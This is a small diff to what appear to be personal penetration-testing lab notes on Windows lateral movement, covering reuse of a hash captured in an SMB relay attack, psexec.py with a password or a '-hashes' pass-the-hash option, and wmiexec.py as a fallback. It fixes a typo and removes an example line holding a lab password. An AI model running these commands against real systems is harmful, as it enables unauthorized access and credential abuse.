@@ -12,9 +12,8 @@ msfconsole
 		use the hash we got in the SMBrelay attack 
 			used the entire hash 
 psexec.py (domain/user):'<PasswordL>'@<machine IP>
-	ex psexec.py MARVEL/tstark:'Password1"@192.168.88.101
 	can also add without password and it will prompt to type
-	canalso use a hash
+	can also use a hash
 		e x psexec.py admin@192.168.88.101 -hashes <Hash>
 wmiexec.py
 	if psexec.py doesnt work
